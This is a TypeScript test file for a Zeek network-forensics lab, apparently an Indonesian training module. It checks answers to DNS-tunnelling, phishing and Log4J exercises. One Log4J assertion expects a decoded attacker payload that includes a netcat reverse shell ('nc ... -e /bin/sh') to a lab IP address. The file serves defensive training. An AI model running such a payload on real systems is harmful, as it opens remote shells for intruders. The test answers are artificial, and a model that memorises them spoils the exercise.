import { describe, expect, it } from 'vitest'
import { Shell } from './shell'
import { EX } from './lab'

function sh(dir: string, ...cmds: string[]): string {
  const shell = new Shell(`${EX}/${dir}`)
  let last = ''
  for (const c of cmds) last = shell.run(c).text
  return last
}

describe('modul Latihan Zeek: jawaban bisa diperoleh dari terminal', () => {
  it('Anomalous DNS', () => {
    const z = 'zeek -C -r dns-tunneling.pcap'
    expect(sh('anomalous-dns', z, 'cat dns.log | zeek-cut qtype_name | grep AAAA | wc -l')).toBe('320')
    expect(sh('anomalous-dns', z, 'cat dns.log | zeek-cut qtype_name | sort | uniq -c | grep AAAA').trim()).toBe('320 AAAA')
    expect(sh('anomalous-dns', z, 'cat conn.log | zeek-cut duration | sort -n | tail -1')).toBe('9.420791')
    expect(sh('anomalous-dns', z, "cat dns.log | zeek-cut query | rev | cut -d '.' -f 1-2 | rev | sort | uniq | wc -l")).toBe('6')
    expect(sh('anomalous-dns', z, 'cat conn.log | zeek-cut id.orig_h | sort | uniq -c | sort -nr | head -1').trim()).toMatch(/^\d+ 10\.20\.57\.3$/)
  })

  it('Phishing', () => {
    const z = 'zeek -C -r phishing.pcap'
    expect(sh('phishing', z, 'cat conn.log | zeek-cut id.orig_h | sort | uniq')).toBe('10.6.27.102')
    expect(sh('phishing', z, 'cat http.log | zeek-cut host uri | grep -e doc -e exe | cut -f 1 | sort -u')).toBe('smart-fax.com')
    expect(sh('phishing', z, 'cat http.log | zeek-cut uri | grep exe')).toBe('/knr.exe')
    expect(sh('phishing', 'zeek -C -r phishing.pcap hash-demo.zeek', 'cat files.log | zeek-cut mime_type md5 | grep msword')).toBe('application/msword\tb5243ec1df7d1d5304189e7db2744128')
    expect(sh('phishing', 'zeek -C -r phishing.pcap file-extract-demo.zeek', 'file extract_files/* | grep -c PE32')).toBe('1')
  })

  it('Log4J', () => {
    const z = 'zeek -C -r log4shell.pcapng detection-log4j.zeek'
    expect(sh('log4j', z, 'cat signatures.log | zeek-cut sig_id | wc -l')).toBe('3')
    expect(sh('log4j', z, 'cat http.log | zeek-cut user_agent | sort | uniq -c | sort -nr | head -1')).toContain('Nmap')
    expect(sh('log4j', z, 'cat http.log | zeek-cut uri | grep Exploit | wc -l')).toBe('3')
    expect(sh('log4j', z, 'cat http.log | zeek-cut uri | grep Exploit | head -1')).toMatch(/\.class$/)
    expect(sh('log4j', z, "cat log4j.log | zeek-cut uri | cut -d '/' -f 5 | base64 -d")).toBe('touch /tmp/pwned\nwhich nc > /tmp/pwned\nnc 192.168.56.102 80 -e /bin/sh')
    expect(sh('log4j', 'echo dG91Y2ggL3RtcC9wd25lZAo= | base64 -d')).toBe('touch /tmp/pwned')
    expect(sh('log4j', 'zeek -C -r log4shell.pcapng', 'ls')).not.toContain('log4j.log')
  })
})
